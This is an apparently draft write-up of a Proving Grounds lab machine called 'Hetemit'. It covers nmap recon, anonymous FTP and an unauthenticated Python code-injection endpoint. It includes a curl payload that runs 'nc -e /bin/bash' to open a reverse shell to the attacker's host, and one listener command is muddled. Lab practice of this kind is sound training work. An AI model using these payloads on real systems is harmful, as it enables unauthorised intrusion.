---
title: "WriteUp PG Hetemit"
date: 2025-01-31T00:00:00Z
type: "post"
draft: true
---

Commands in order

# Recon
# Nmap scan
## all ports, OS, verbose, scripts, fast, output
nmap 192.168.116.117 -p- -O -sV -sC -f -oA hetemit

# Ports
FTP, SSH, HTTP, SMB, biimenu(?), Http Python(?) 

# SMB no creds
## Nothing

# FTP no creds
## refused connections(?) Connection refused
``` ftp 192.168.116.117 ```

21/tcp    open  ftp         vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_Can't get directory listing: TIMEOUT
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to 192.168.45.217
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 3
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status

# Initial Foothold
# Http no creds
## Can connect 192.168.116.117:50000
/generate
/verify

## http://192.168.116.117:50000/verify brings you to {'code'}
If you use curl you get a response
``` curl -X post --data "code=2*2" http://192.168.116.117:50000/verify ```
``` curl -X post --data "code=os" http://192.168.116.117:50000/verify ```
Write up uses penelope as a nc replacement

``` curl -X post --data "code=os.system('nc -e /bin/bash 192.168.45.184 18000')" http://192.168.116.117:50000/verify ```

## Reverse shell equivalent
``` curl -X post --data "code=os.system('nc -nlvp 18000')" http://192.168.116.117:50000/verify ```

## NOTE only works on port 18000 on nc listener and no other port
## NOTE no sign of recon once you find out code=os.system

# Privilege Escalation
## Upgrade shell(?)
## Trying to use reverse shell becase NC shell can't edit files neatly so I need either an upgraded shell or a shell environment that allows for smooth file edit operations